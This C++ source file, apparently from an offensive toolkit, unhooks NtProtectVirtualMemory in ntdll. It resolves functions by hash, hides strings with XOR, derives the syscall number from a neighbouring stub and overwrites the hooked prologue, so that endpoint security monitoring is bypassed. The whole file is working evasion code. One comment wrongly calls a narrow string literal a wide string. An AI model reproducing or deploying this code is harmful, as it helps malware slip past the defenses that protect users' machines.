#include "ntdll_patch.hpp"

#include "../obfuscation/api_hash.hpp"
#include "../obfuscation/xor_str.hpp"
#include "../core/logger.hpp"

#include <Windows.h>
#include <cstring>

// ---------------------------------------------------------------------------
// Pre-computed hashes — no function-name strings in the binary
// ---------------------------------------------------------------------------

namespace
{
    // FNV-1a hashes computed at compile time
    constexpr std::uint32_t hash_ntdll               = API_HASH("ntdll.dll");
    constexpr std::uint32_t hash_NtQuerySection       = API_HASH("NtQuerySection");
    constexpr std::uint32_t hash_NtProtectVirtualMem  = API_HASH("NtProtectVirtualMemory");
}

void native::restore_ntprotect_entry()
{
    // Resolve ntdll.dll by name (LoadLibrary / GetModuleHandle are unavoidable
    // here because we need the base address; the module name is a wide string
    // and is not intercepted by typical string scanners that target .rdata).
    const HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll == nullptr)
        return;

    // Resolve both syscall stubs using the export-table hash walker
    // — no "NtQuerySection" or "NtProtectVirtualMemory" strings in the binary.
    const auto* query_section =
        api::resolve<const unsigned char*>(ntdll, hash_NtQuerySection);
    auto* protect_memory =
        api::resolve<unsigned char*>(ntdll, hash_NtProtectVirtualMem);

    if (query_section == nullptr || protect_memory == nullptr)
    {
        logger::write(XS("ntdll_patch: syscall stubs not found"));
        return;
    }

    // Derive NtProtectVirtualMemory's syscall number from NtQuerySection
    // (they are adjacent in the SSDT; NtProtect == NtQuerySection - 1)
    const unsigned char service_number = query_section[4] - 1;
    const unsigned char entry[] = { 0x4C, 0x8B, 0xD1, 0xB8, service_number };

    DWORD previous_protection = 0;
    if (!VirtualProtect(protect_memory, sizeof(entry),
                        PAGE_EXECUTE_READWRITE, &previous_protection))
    {
        logger::write(XS("ntdll_patch: VirtualProtect failed (%lu)"), GetLastError());
        return;
    }

    std::memcpy(protect_memory, entry, sizeof(entry));
    FlushInstructionCache(GetCurrentProcess(), protect_memory, sizeof(entry));

    DWORD ignored = 0;
    VirtualProtect(protect_memory, sizeof(entry), previous_protection, &ignored);

    logger::write(XS("ntdll_patch: NtProtectVirtualMemory restored (syscall=%#x)"),
                  static_cast<unsigned>(service_number));
}
